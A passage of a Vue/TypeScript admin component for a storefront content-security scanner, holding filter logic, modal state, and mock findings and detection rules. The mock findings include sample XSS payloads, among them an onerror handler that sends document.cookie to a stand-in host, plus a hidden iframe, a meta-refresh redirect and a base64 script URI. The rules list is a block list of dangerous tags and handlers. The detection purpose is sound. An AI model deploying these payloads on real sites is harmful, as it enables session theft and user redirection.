  if (rulesSubTab.value === 'hidden_content') {
    fetchHiddenContentRules();
  }
});

// Reactively watch obfuscation filters & trigger fetch
watch(
  [
    debouncedObfuscationSearch,
    obfuscationCategory,
    obfuscationSeverity,
    obfuscationIsActive,
    obfuscationIsEnabled,
    obfuscationOrdering,
    obfuscationPageSize
  ],
  () => {
    obfuscationPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'obfuscation') {
      fetchObfuscationRules();
    }
  }
);

watch(obfuscationPage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'obfuscation') {
    fetchObfuscationRules();
  }
});

// Reactively watch redirect filters & trigger fetch
watch(
  [
    debouncedRedirectSearch,
    redirectCategory,
    redirectSeverity,
    redirectIsActive,
    redirectIsEnabled,
    redirectOrdering,
    redirectPageSize
  ],
  () => {
    redirectPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'redirects') {
      fetchRedirectRules();
    }
  }
);

watch(redirectPage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'redirects') {
    fetchRedirectRules();
  }
});

watch([mainTab, rulesSubTab], () => {
  updateRouteQuery();
  if (mainTab.value === 'rules') {
    if (rulesSubTab.value === 'keywords') {
      fetchKeywordRules();
    } else if (rulesSubTab.value === 'domains') {
      fetchDomainRules();
    } else if (rulesSubTab.value === 'hidden_content') {
      fetchHiddenContentRules();
    } else if (rulesSubTab.value === 'obfuscation') {
      fetchObfuscationRules();
    } else if (rulesSubTab.value === 'redirects') {
      fetchRedirectRules();
    }
  }
});

// Formatting helpers
const formatDate = (dateStr?: string | null): string => {
  if (!dateStr) return 'N/A';
  try {
    const d = new Date(dateStr);
    if (isNaN(d.getTime())) return String(dateStr);
    return new Intl.DateTimeFormat('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric'
    }).format(d);
  } catch {
    return String(dateStr);
  }
};

// Scan State
const isScanning = ref(false);
const scanProgress = ref(0);
const scanStepText = ref('');
const lastScanTimestamp = ref('14 minutes ago');
const totalEntitiesScanned = ref(4306);

// Findings Mock Data
const findings = ref<SecurityFinding[]>([
  {
    id: 'SEC-1092',
    contentType: 'Product',
    contentId: '101',
    contentName: 'ASUS ROG Strix GeForce RTX 4090 OC Edition 24GB',
    contentSlug: 'asus-rog-strix-geforce-rtx-4090-oc-edition-24gb',
    categoryName: 'Graphics Cards',
    field: 'description',
    riskScore: 98,
    status: 'Critical',
    severity: 'Critical',
    detector: 'Domain',
    ruleName: 'Blacklisted Promo Host',
    description: 'Blacklisted affiliate casino and promo redirect domain found embedded in description hyperlink.',
    matchedValue: 'https://casino-example.com/bonus-claim?ref=9982',
    contextSnippetBefore: '...equipped with axial-tech fan technology and a patented vapor chamber. For official claims, rebates and rewards visit ',
    contextSnippetMatched: 'https://casino-example.com/bonus-claim?ref=9982',
    contextSnippetAfter: ' to register your warranty and redeem exclusive cashback immediately...',
    lineOffset: 42,
    scannedAt: '2026-08-25 11:52 UTC',
    storefrontUrl: '/product/asus-rog-strix-geforce-rtx-4090-oc-edition-24gb/',
    adminEditUrl: '/admin/products?modal=edit&id=101'
  },
  {
    id: 'SEC-1088',
    contentType: 'Product',
    contentId: '104',
    contentName: 'MSI Katana 15 B13V 15.6" 144Hz Gaming Laptop',
    contentSlug: 'msi-katana-15-b13v-gaming-laptop',
    categoryName: 'Gaming Laptops',
    field: 'specifications',
    riskScore: 92,
    status: 'Critical',
    severity: 'Critical',
    detector: 'HTML',
    ruleName: 'Disallowed iframe Injection',
    description: 'Dangerous inline <iframe> tag with cross-origin external tracking source detected in specification table.',
    matchedValue: '<iframe src="https://tracker-telemetry.biz/embed.html" width="0" height="0"></iframe>',
    contextSnippetBefore: '...Display: 15.6" FHD 144Hz IPS-Level Display. ',
    contextSnippetMatched: '<iframe src="https://tracker-telemetry.biz/embed.html" width="0" height="0"></iframe>',
    contextSnippetAfter: ' Operating System: Windows 11 Home Advanced Edition...',
    lineOffset: 18,
    scannedAt: '2026-08-25 11:48 UTC',
    storefrontUrl: '/product/msi-katana-15-b13v-gaming-laptop/',
    adminEditUrl: '/admin/products?modal=edit&id=104'
  },
  {
    id: 'SEC-1074',
    contentType: 'Product',
    contentId: '109',
    contentName: 'Corsair Vengeance RGB DDR5 32GB (2x16GB) 6000MHz CL36',
    contentSlug: 'corsair-vengeance-rgb-ddr5-32gb-6000mhz',
    categoryName: 'Memory / RAM',
    field: 'description',
    riskScore: 84,
    status: 'High Risk',
    severity: 'High',
    detector: 'Attribute',
    ruleName: 'Dangerous Inline onerror Handler',
    description: 'Inline JavaScript event attribute `onerror` detected inside custom HTML image element.',
    matchedValue: 'onerror="fetch(\'https://telemetry-log.net/p\', {method:\'POST\',body:document.cookie})"',
    contextSnippetBefore: '...features dynamic ten-zone RGB lighting. <img src="cor-vengeance.png" ',
    contextSnippetMatched: 'onerror="fetch(\'https://telemetry-log.net/p\', {method:\'POST\',body:document.cookie})"',
    contextSnippetAfter: ' class="w-full h-auto" /> Designed for high-frequency overclocking...',
    lineOffset: 27,
    scannedAt: '2026-08-25 11:40 UTC',
    storefrontUrl: '/product/corsair-vengeance-rgb-ddr5-32gb-6000mhz/',
    adminEditUrl: '/admin/products?modal=edit&id=109'
  },
  {
    id: 'SEC-1065',
    contentType: 'Category',
    contentId: '18',
    contentName: 'High Performance Gaming Laptops',
    contentSlug: 'gaming-laptops',
    categoryName: 'Laptops',
    field: 'category_description',
    riskScore: 78,
    status: 'High Risk',
    severity: 'High',
    detector: 'Redirect',
    ruleName: 'External Meta Refresh Redirect',
    description: 'Meta refresh tag detected directing traffic away to unapproved third-party landing page.',
    matchedValue: '<meta http-equiv="refresh" content="3;url=https://free-giveaway-zone.xyz">',
    contextSnippetBefore: '...Explore the premier collection of portable computing rigs. ',
    contextSnippetMatched: '<meta http-equiv="refresh" content="3;url=https://free-giveaway-zone.xyz">',
    contextSnippetAfter: ' Top-rated brands including ASUS, MSI, Razer, and Lenovo...',
    lineOffset: 5,
    scannedAt: '2026-08-25 11:34 UTC',
    storefrontUrl: '/product-category/gaming-laptops/',
    adminEditUrl: '/admin/categories?modal=edit&id=18'
  },
  {
    id: 'SEC-1052',
    contentType: 'Product',
    contentId: '115',
    contentName: 'Samsung 990 PRO 2TB PCIe 4.0 NVMe M.2 SSD',
    contentSlug: 'samsung-990-pro-2tb-pcie-4-nvme-m2-ssd',
    categoryName: 'Storage / SSD',
    field: 'short_description',
    riskScore: 71,
    status: 'High Risk',
    severity: 'High',
    detector: 'Domain',
    ruleName: 'Unverified External File Host',
    description: 'Link pointing to known unverified file downloading portal in short description.',
    matchedValue: 'https://free-file-vault-dl.com/driver-installer.exe',
    contextSnippetBefore: '...Sequential read speeds up to 7,450 MB/s. Official driver package: ',
    contextSnippetMatched: 'https://free-file-vault-dl.com/driver-installer.exe',
    contextSnippetAfter: ' for Windows 10 and 11 installation...',
    lineOffset: 12,
    scannedAt: '2026-08-25 11:22 UTC',
    storefrontUrl: '/product/samsung-990-pro-2tb-pcie-4-nvme-m2-ssd/',
    adminEditUrl: '/admin/products?modal=edit&id=115'
  },
  {
    id: 'SEC-1044',
    contentType: 'Product',
    contentId: '122',
    contentName: 'Logitech G Pro X Superlight 2 Wireless Gaming Mouse',
    contentSlug: 'logitech-g-pro-x-superlight-2',
    categoryName: 'Peripherals / Mice',
    field: 'description',
    riskScore: 58,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Keyword',
    ruleName: 'Blacklisted Keyword match: "free crypto giveaway"',
    description: 'Suspicious spam keyword combination detected in customer review snippet or seller note.',
    matchedValue: 'free crypto giveaway',
    contextSnippetBefore: '...Featuring HERO 2 Sensor with 32,000 DPI. Enter our seasonal ',
    contextSnippetMatched: 'free crypto giveaway',
    contextSnippetAfter: ' by adding this product to your public wishlist today...',
    lineOffset: 34,
    scannedAt: '2026-08-25 11:15 UTC',
    storefrontUrl: '/product/logitech-g-pro-x-superlight-2/',
    adminEditUrl: '/admin/products?modal=edit&id=122'
  },
  {
    id: 'SEC-1039',
    contentType: 'Category',
    contentId: '24',
    contentName: 'Mechanical Keyboards & Switches',
    contentSlug: 'keyboards-switches',
    categoryName: 'Peripherals',
    field: 'category_description',
    riskScore: 52,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Hidden Content',
    ruleName: 'Invisible Font Zero-Size Div',
    description: 'Hidden zero-pixel div element containing keyword stuffing detected.',
    matchedValue: '<div style="font-size:0px;color:transparent;display:none;">cheap laptops free keys</div>',
    contextSnippetBefore: '...Custom hot-swappable mechanical keyboards and enthusiast switches. ',
    contextSnippetMatched: '<div style="font-size:0px;color:transparent;display:none;">cheap laptops free keys</div>',
    contextSnippetAfter: ' Browse tactile, linear, and clicky switches...',
    lineOffset: 9,
    scannedAt: '2026-08-25 11:02 UTC',
    storefrontUrl: '/product-category/keyboards-switches/',
    adminEditUrl: '/admin/categories?modal=edit&id=24'
  },
  {
    id: 'SEC-1025',
    contentType: 'Product',
    contentId: '130',
    contentName: 'NZXT Kraken Elite 360 RGB Liquid CPU Cooler with LCD Display',
    contentSlug: 'nzxt-kraken-elite-360-rgb',
    categoryName: 'Cooling / AIO',
    field: 'description',
    riskScore: 46,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Obfuscation',
    ruleName: 'Base64 Encoded JS Data URI',
    description: 'Obfuscated Base64 data URI string detected inside hyperlink tag.',
    matchedValue: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    contextSnippetBefore: '...Equipped with custom pump and high-res LCD screen. Sample gif: <a href="',
    contextSnippetMatched: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    contextSnippetAfter: '">Click for animation preview</a>...',
    lineOffset: 55,
    scannedAt: '2026-08-25 10:45 UTC',
    storefrontUrl: '/product/nzxt-kraken-elite-360-rgb/',
    adminEditUrl: '/admin/products?modal=edit&id=130'
  },
  {
    id: 'SEC-1018',
    contentType: 'Product',
    contentId: '142',
    contentName: 'Seasonic Focus GX-850 850W 80+ Gold Full Modular PSU',
    contentSlug: 'seasonic-focus-gx-850-psu',
    categoryName: 'Power Supplies',
    field: 'specifications',
    riskScore: 28,
    status: 'Needs Review',
    severity: 'Low',
    detector: 'Keyword',
    ruleName: 'Suspicious External Contact Token',
    description: 'Direct Telegram/WhatsApp handle found in specification field bypassing official support channel.',
    matchedValue: 't.me/direct_tech_support_bot',
    contextSnippetBefore: '...Warranty: 10 Years Manufacturer Warranty. For immediate claims contact: ',
    contextSnippetMatched: 't.me/direct_tech_support_bot',
    contextSnippetAfter: ' or visit Seasonic global portal...',
    lineOffset: 14,
    scannedAt: '2026-08-25 10:30 UTC',
    storefrontUrl: '/product/seasonic-focus-gx-850-psu/',
    adminEditUrl: '/admin/products?modal=edit&id=142'
  },
  {
    id: 'SEC-1010',
    contentType: 'Product',
    contentId: '150',
    contentName: 'Lian Li O11 Dynamic EVO Mid-Tower Case - Black',
    contentSlug: 'lian-li-o11-dynamic-evo',
    categoryName: 'PC Cases',
    field: 'description',
    riskScore: 0,
    status: 'Clean',
    severity: 'Low',
    detector: 'HTML',
    ruleName: 'Standard Clean Inspection',
    description: 'All HTML tags sanitized and compliant with Storefront standards.',
    matchedValue: 'None',
    contextSnippetBefore: '...Dual chamber chassis with flexible configuration. ',
    contextSnippetMatched: 'Compliant HTML',
    contextSnippetAfter: ' Supports up to 3x 360mm radiators...',
    lineOffset: 1,
    scannedAt: '2026-08-25 10:15 UTC',
    storefrontUrl: '/product/lian-li-o11-dynamic-evo/',
    adminEditUrl: '/admin/products?modal=edit&id=150'
  },
  {
    id: 'SEC-1004',
    contentType: 'Product',
    contentId: '155',
    contentName: 'AMD Ryzen 7 7800X3D 8-Core 16-Thread Desktop Processor',
    contentSlug: 'amd-ryzen-7-7800x3d',
    categoryName: 'Processors / CPU',
    field: 'description',
    riskScore: 0,
    status: 'Resolved',
    severity: 'Low',
    detector: 'Domain',
    ruleName: 'Prior Flag Resolved',
    description: 'Previously flagged unverified link corrected by staff administrator.',
    matchedValue: 'None (Resolved)',
    contextSnippetBefore: '...Built with 3D V-Cache technology for ultimate gaming performance. ',
    contextSnippetMatched: 'Sanitized Content',
    contextSnippetAfter: ' Compatible with AM5 socket motherboards...',
    lineOffset: 8,
    scannedAt: '2026-08-25 09:40 UTC',
    storefrontUrl: '/product/amd-ryzen-7-7800x3d/',
    adminEditUrl: '/admin/products?modal=edit&id=155'
  }
]);

// ==========================================
// Detection Rules Mock Data
// ==========================================
const rules = ref<DetectionRule[]>([
  // Keywords
  { id: 'R-KW-01', type: 'keyword', pattern: 'free crypto giveaway', category: 'Spam & Scam', severity: 'High', description: 'Detects crypto phishing and fraudulent giveaway phrases in product bodies', enabled: true, matchCount: 14, updatedAt: '2026-08-20' },
  { id: 'R-KW-02', type: 'keyword', pattern: 'whatsapp +', category: 'Off-Platform Contacts', severity: 'Medium', description: 'Blocks direct off-platform messaging solicitation numbers', enabled: true, matchCount: 8, updatedAt: '2026-08-18' },
  { id: 'R-KW-03', type: 'keyword', pattern: 'telegram @', category: 'Off-Platform Contacts', severity: 'Medium', description: 'Blocks unauthorized Telegram support contact strings', enabled: true, matchCount: 19, updatedAt: '2026-08-15' },
  { id: 'R-KW-04', type: 'keyword', pattern: 'viagra|cialis|casino bonus', category: 'Spam Blacklist', severity: 'Critical', description: 'Strict pharma and gambling spam keyword blacklist', enabled: true, matchCount: 42, updatedAt: '2026-08-10' },
  
  // Domains
  { id: 'R-DM-01', type: 'domain', pattern: 'casino-example.com', category: 'Gambling Blacklist', severity: 'Critical', description: 'Blacklisted affiliate casino redirect portal', enabled: true, matchCount: 3, updatedAt: '2026-08-22' },
  { id: 'R-DM-02', type: 'domain', pattern: 'free-giveaway-zone.xyz', category: 'Phishing Host', severity: 'Critical', description: 'Known phishing lure hosting fake reward claim forms', enabled: true, matchCount: 6, updatedAt: '2026-08-21' },
  { id: 'R-DM-03', type: 'domain', pattern: 'tracker-telemetry.biz', category: 'Tracking & Adware', severity: 'High', description: 'Unapproved third-party tracking pixel script host', enabled: true, matchCount: 1, updatedAt: '2026-08-19' },
  { id: 'R-DM-04', type: 'domain', pattern: 'free-file-vault-dl.com', category: 'Malicious Downloads', severity: 'Critical', description: 'Suspicious executable payload distribution domain', enabled: true, matchCount: 2, updatedAt: '2026-08-12' },

  // HTML
  { id: 'R-HT-01', type: 'html', pattern: '<script>', category: 'Dangerous Tags', severity: 'Critical', description: 'Strict ban on raw inline or external script tags in rich text', enabled: true, matchCount: 11, updatedAt: '2026-08-24' },
  { id: 'R-HT-02', type: 'html', pattern: '<iframe>', category: 'Embedded Content', severity: 'Critical', description: 'Disallows embedded third party frames and overlays', enabled: true, matchCount: 4, updatedAt: '2026-08-24' },
  { id: 'R-HT-03', type: 'html', pattern: '<object>', category: 'Plugin Objects', severity: 'Critical', description: 'Blocks legacy ActiveX and object execution containers', enabled: true, matchCount: 0, updatedAt: '2026-08-10' },
  { id: 'R-HT-04', type: 'html', pattern: '<embed>', category: 'Plugin Objects', severity: 'Critical', description: 'Disallows binary payload embedding tags', enabled: true, matchCount: 0, updatedAt: '2026-08-10' },
  { id: 'R-HT-05', type: 'html', pattern: '<base>', category: 'DOM Hijacking', severity: 'Critical', description: 'Prevents base URL redirection hijacking in rich descriptions', enabled: true, matchCount: 1, updatedAt: '2026-08-05' },

  // Attributes
  { id: 'R-AT-01', type: 'attribute', pattern: 'onerror', category: 'Event Handlers', severity: 'Critical', description: 'Blocks inline image / media error event handler execution', enabled: true, matchCount: 5, updatedAt: '2026-08-23' },
  { id: 'R-AT-02', type: 'attribute', pattern: 'onclick', category: 'Event Handlers', severity: 'Critical', description: 'Disallows raw click event attributes in customer content', enabled: true, matchCount: 9, updatedAt: '2026-08-23' },
  { id: 'R-AT-03', type: 'attribute', pattern: 'onload', category: 'Event Handlers', severity: 'Critical', description: 'Blocks body and element load event injection triggers', enabled: true, matchCount: 2, updatedAt: '2026-08-20' },
  { id: 'R-AT-04', type: 'attribute', pattern: 'javascript:', category: 'URI Scheme', severity: 'Critical', description: 'Blocks pseudo-protocol javascript execution in href attributes', enabled: true, matchCount: 7, updatedAt: '2026-08-15' },
  { id: 'R-AT-05', type: 'attribute', pattern: 'formaction', category: 'Form Redirection', severity: 'High', description: 'Blocks formaction override on input and button tags', enabled: true, matchCount: 0, updatedAt: '2026-08-08' },

  // Redirects
  { id: 'R-RD-01', type: 'redirect', pattern: 'http-equiv="refresh"', category: 'Meta Navigation', severity: 'Critical', description: 'Disallows automated client-side meta refresh triggers', enabled: true, matchCount: 2, updatedAt: '2026-08-22' },
  { id: 'R-RD-02', type: 'redirect', pattern: 'window.location', category: 'DOM Redirection', severity: 'Critical', description: 'Detects JavaScript navigation hijacking attempts', enabled: true, matchCount: 1, updatedAt: '2026-08-18' },
  { id: 'R-RD-03', type: 'redirect', pattern: 'bit.ly/|tinyurl.com/', category: 'URL Shorteners', severity: 'Medium', description: 'Flags obfuscated shortener URLs that hide actual destinations', enabled: true, matchCount: 18, updatedAt: '2026-08-14' }
]);

const visibleSubTabs = computed(() => {
  const tabs = [];
  if (canViewKeywords.value) {
    tabs.push({ id: 'keywords', label: 'Keywords', count: keywordRulesCount.value });
  }
  if (canViewDomains.value) {
    tabs.push({ id: 'domains', label: 'Domains', count: domainRulesCount.value });
  }
  if (canViewHiddenContent.value) {
    tabs.push({ id: 'hidden_content', label: 'Hidden Content', count: hiddenContentRulesCount.value });
  }
  if (canViewObfuscation.value) {
    tabs.push({ id: 'obfuscation', label: 'Obfuscation', count: obfuscationRulesCount.value });
  }
  tabs.push(
    { id: 'html', label: 'Dangerous HTML', count: rules.value.filter(r => r.type === 'html').length },
    { id: 'attributes', label: 'Dangerous Attributes', count: rules.value.filter(r => r.type === 'attribute').length },
    { id: 'redirects', label: 'Redirect Rules', count: rules.value.filter(r => r.type === 'redirect').length }
  );
  return tabs;
});

// ==========================================
// Filter State for Scan Results
// ==========================================
const searchQuery = ref('');
const debouncedSearch = refDebounced(searchQuery, 300);
const filterContentType = ref('all');
const filterStatus = ref('all');
const filterSeverity = ref('all');
const filterDetector = ref('all');
const filterCategory = ref('all');

// Pagination
const currentPage = ref(1);
const itemsPerPage = ref(10);

const uniqueCategories = computed(() => {
  const cats = new Set<string>();
  findings.value.forEach(f => {
    if (f.categoryName) cats.add(f.categoryName);
  });
  return Array.from(cats);
});

const filteredFindings = computed(() => {
  return findings.value.filter(item => {
    // Search
    if (debouncedSearch.value.trim()) {
      const q = debouncedSearch.value.toLowerCase().trim();
      const match = 
        item.contentName.toLowerCase().includes(q) ||
        item.description.toLowerCase().includes(q) ||
        item.matchedValue.toLowerCase().includes(q) ||
        item.field.toLowerCase().includes(q) ||
        item.id.toLowerCase().includes(q);
      if (!match) return false;
    }

    // Content Type
    if (filterContentType.value !== 'all' && item.contentType !== filterContentType.value) {
      return false;
    }

    // Status
    if (filterStatus.value !== 'all' && item.status !== filterStatus.value) {
      return false;
    }

    // Severity
    if (filterSeverity.value !== 'all' && item.severity !== filterSeverity.value) {
      return false;
    }

    // Detector
    if (filterDetector.value !== 'all' && item.detector !== filterDetector.value) {
      return false;
    }

    // Category
    if (filterCategory.value !== 'all' && item.categoryName !== filterCategory.value) {
      return false;
    }

    return true;
  });
});

const totalPages = computed(() => {
  return Math.ceil(filteredFindings.value.length / itemsPerPage.value) || 1;
});

const paginatedFindings = computed(() => {
  const start = (currentPage.value - 1) * itemsPerPage.value;
  return filteredFindings.value.slice(start, start + itemsPerPage.value);
});

watch([debouncedSearch, filterContentType, filterStatus, filterSeverity, filterDetector, filterCategory, itemsPerPage], () => {
  currentPage.value = 1;
});

const resetFilters = () => {
  searchQuery.value = '';
  filterContentType.value = 'all';
  filterStatus.value = 'all';
  filterSeverity.value = 'all';
  filterDetector.value = 'all';
  filterCategory.value = 'all';
  toastInfo('Filters have been reset.');
};

// Summary metrics computed
const summaryMetrics = computed(() => {
  const total = totalEntitiesScanned.value;
  const critical = findings.value.filter(f => f.status === 'Critical').length;
  const high = findings.value.filter(f => f.status === 'High Risk').length;
  const needsReview = findings.value.filter(f => f.status === 'Needs Review').length;
  const clean = total - (critical + high + needsReview);
  const cleanPercent = ((clean / total) * 100).toFixed(1);

  return {
    total,
    clean,
    cleanPercent,
    needsReview,
    high,
    critical
  };
});

// Recent findings for Overview
const recentFindings = computed(() => {
  return findings.value.slice(0, 5);
});

// ==========================================
// Modal State: Finding Details
// ==========================================
const isDetailModalOpen = ref(false);
const selectedFinding = ref<SecurityFinding | null>(null);

const openFindingDetail = (finding: SecurityFinding) => {
  selectedFinding.value = finding;
  isDetailModalOpen.value = true;
};

const closeFindingDetail = () => {
  isDetailModalOpen.value = false;
  selectedFinding.value = null;
};

// Actions inside Finding Details Modal
const markFindingAsSafe = (finding: SecurityFinding) => {
  finding.status = 'Clean';
  finding.riskScore = 0;
  toastSuccess(`Finding ${finding.id} marked as safe and whitelisted.`);
  closeFindingDetail();
};

const confirmFindingSuspicious = (finding: SecurityFinding) => {
  finding.status = 'High Risk';
  toastWarning(`Finding ${finding.id} confirmed as verified security risk.`);
};

const resolveFinding = (finding: SecurityFinding) => {
  finding.status = 'Resolved';
  finding.riskScore = 0;
  toastSuccess(`Finding ${finding.id} marked as resolved.`);
  closeFindingDetail();
};

const isRescanningItem = ref(false);
const rescanFinding = (finding: SecurityFinding) => {
  isRescanningItem.value = true;
  setTimeout(() => {
    isRescanningItem.value = false;
    toastSuccess(`Rescan completed for ${finding.contentName}. Current content is verified.`);
  }, 1200);
};

// ==========================================
// Mock Scan Action
// ==========================================
const runFullScan = () => {
  if (isScanning.value) return;
  isScanning.value = true;
  scanProgress.value = 0;
  scanStepText.value = 'Initializing payload parser and rule registry...';

  const steps = [
    { progress: 15, text: 'Scanning 4,120 Product titles, descriptions & specification matrices...' },
    { progress: 45, text: 'Inspecting 186 Category tree descriptions and marketing blocks...' },
    { progress: 70, text: 'Running Domain Blacklist & Cross-Site Scripting heuristics...' },
    { progress: 90, text: 'Checking HTML tag structures and event attributes...' },
    { progress: 100, text: 'Scan complete. Compiling threat analysis report...' }
  ];

  let stepIdx = 0;
  const interval = setInterval(() => {
    if (stepIdx < steps.length) {
      const step = steps[stepIdx];
      if (step) {
        scanProgress.value = step.progress;
        scanStepText.value = step.text;
      }
      stepIdx++;
    } else {
      clearInterval(interval);
      setTimeout(() => {
        isScanning.value = false;
        lastScanTimestamp.value = 'Just now';
        toastSuccess('Catalog Security Scan completed. All 4,306 entities inspected.');
      }, 500);
    }
  }, 600);
};

// ==========================================
// Modal State: Keyword Rule Details (View, Edit & Delete)
// ==========================================
const isKeywordDetailsLoading = ref(false);
const selectedKeywordRule = ref<KeywordRuleDetail | null>(null);
const editingKeywordRuleId = ref<number | null>(null);
const isSubmittingKeywordEdit = ref(false);
const isDeletingKeywordRule = ref(false);
const deletingKeywordRule = ref<{ id: number; keyword: string } | null>(null);

const keywordEditForm = ref<{
  keyword: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: KeywordMatchType;
  is_enabled: boolean;
  description: string;
}>({
  keyword: '',
  category: 'SPAM',
  severity: 'HIGH',
  match_type: 'WORD',
  is_enabled: true,
  description: ''
});

const originalKeywordRuleData = ref<{
  keyword: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: KeywordMatchType;
  is_enabled: boolean;
  description: string;
} | null>(null);

const keywordModalState = useAdminModalState<KeywordRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'keywords') return null;
    isKeywordDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getKeywordRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve keyword rule details.');
      toastError(msg);
      return null;
    } finally {
      isKeywordDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'keywords') {
      toastError(`Keyword Rule #${id} could not be resolved.`);
      keywordModalState.closeModal({ replace: true });
    }
  }
});

watch(() => keywordModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'keywords') {
    selectedKeywordRule.value = newEntity;

    if (keywordModalState.isEdit.value) {
      if (!canEditKeywordRule.value) {
        toastError('You do not have permission to edit keyword rules.');
        keywordModalState.closeModal({ replace: true });
        return;
      }
      editingKeywordRuleId.value = newEntity.id;
      keywordEditForm.value = {
        keyword: newEntity.keyword || '',
        category: newEntity.category || 'SPAM',
        severity: newEntity.severity || 'HIGH',
        match_type: newEntity.match_type || 'WORD',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalKeywordRuleData.value = {
        keyword: newEntity.keyword || '',
        category: newEntity.category || 'SPAM',
        severity: newEntity.severity || 'HIGH',
        match_type: newEntity.match_type || 'WORD',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }

    if (keywordModalState.isDelete.value) {
      if (!canDeleteKeywordRule.value) {
        toastError('You do not have permission to delete keyword rules.');
        keywordModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingKeywordRule.value) {
        deletingKeywordRule.value = {
          id: newEntity.id,
          keyword: newEntity.keyword || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => keywordModalState.isView.value, (isView) => {
  if (!isView && !keywordModalState.isEdit.value && !keywordModalState.isDelete.value) {
    selectedKeywordRule.value = null;
  }
}, { immediate: true });

watch(() => keywordModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingKeywordRuleId.value = null;
    originalKeywordRuleData.value = null;
  }
}, { immediate: true });

watch(() => keywordModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingKeywordRule.value = null;
  } else if (!canDeleteKeywordRule.value) {
    toastError('You do not have permission to delete keyword rules.');
    keywordModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openKeywordViewModal = (id: number | string) => {
  if (!canViewKeywords.value) {
    toastError('You do not have permission to view keyword rules.');
    return;
  }
  keywordModalState.openView(id);
};

const closeKeywordViewModal = () => {
  keywordModalState.closeModal();
};

// ==========================================
// Modal State: Domain Rule Details (View) & Edit & Delete
// ==========================================
const isDomainDetailsLoading = ref(false);
const selectedDomainRule = ref<DomainRuleDetail | null>(null);
const editingDomainRuleId = ref<number | null>(null);
const isSubmittingDomainEdit = ref(false);
const isDeletingDomainRule = ref(false);
const deletingDomainRule = ref<{ id: number; domain: string } | null>(null);

const domainEditForm = ref<{
  domain: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: DomainMatchType;
  is_enabled: boolean;
  description: string;
}>({
  domain: '',
  category: 'MALWARE',
  severity: 'HIGH',
  match_type: 'SUBDOMAIN',
  is_enabled: true,
  description: ''
});

const originalDomainRuleData = ref<{
  domain: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: DomainMatchType;
  is_enabled: boolean;
  description: string;
} | null>(null);

const domainModalState = useAdminModalState<DomainRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'domains') return null;
    isDomainDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getDomainRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve domain rule details.');
      toastError(msg);
      return null;
    } finally {
      isDomainDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'domains') {
      toastError(`Domain Rule #${id} could not be resolved.`);
      domainModalState.closeModal({ replace: true });
    }
  }
});

watch(() => domainModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'domains') {
    selectedDomainRule.value = newEntity;

    if (domainModalState.isEdit.value) {
      if (!canEditDomainRule.value) {
        toastError('You do not have permission to edit domain rules.');
        domainModalState.closeModal({ replace: true });
        return;
      }
      editingDomainRuleId.value = newEntity.id;
      domainEditForm.value = {
        domain: newEntity.domain || '',
        category: newEntity.category || 'MALWARE',
        severity: newEntity.severity || 'HIGH',
        match_type: newEntity.match_type || 'SUBDOMAIN',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalDomainRuleData.value = {
        domain: newEntity.domain || '',
        category: newEntity.category || 'MALWARE',
        severity: newEntity.severity || 'HIGH',
        match_type: newEntity.match_type || 'SUBDOMAIN',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }

    if (domainModalState.isDelete.value) {
      if (!canDeleteDomainRule.value) {
        toastError('You do not have permission to delete domain rules.');
        domainModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingDomainRule.value) {
        deletingDomainRule.value = {
          id: newEntity.id,
          domain: newEntity.domain || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => domainModalState.isView.value, (isView) => {
  if (!isView && !domainModalState.isEdit.value && !domainModalState.isDelete.value) {
    selectedDomainRule.value = null;
  }
}, { immediate: true });

watch(() => domainModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingDomainRuleId.value = null;
    originalDomainRuleData.value = null;
  }
}, { immediate: true });

watch(() => domainModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingDomainRule.value = null;
  } else if (!canDeleteDomainRule.value) {
    toastError('You do not have permission to delete domain rules.');
    domainModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openDomainViewModal = (id: number | string) => {
  if (!canViewDomains.value) {
    toastError('You do not have permission to view domain rules.');
    return;
  }
  domainModalState.openView(id);
};

const closeDomainViewModal = () => {
  domainModalState.closeModal();
};

// ==========================================
// Modal State: Hidden Content Rule Details (View, Edit, Delete)
// ==========================================
const isHiddenContentDetailsLoading = ref(false);
